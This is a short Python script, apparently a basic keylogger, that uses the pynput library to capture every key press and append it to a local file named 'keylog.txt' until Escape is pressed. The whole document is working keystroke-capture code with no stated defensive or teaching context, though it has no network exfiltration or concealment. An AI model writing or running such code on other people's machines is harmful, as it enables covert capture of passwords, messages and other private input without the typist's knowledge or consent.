import pynput

from pynput.keyboard import Key, Listener

# This file will store the key logs
log_file = "keylog.txt"

def on_press(key):
    # Convert the key to a string format and write it to the log file
    with open(log_file, "a") as log:
        log.write(f"{str(key)}\n")

def on_release(key):
    # Stop the listener if the Escape key is pressed
    if key == Key.esc:
        return False

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

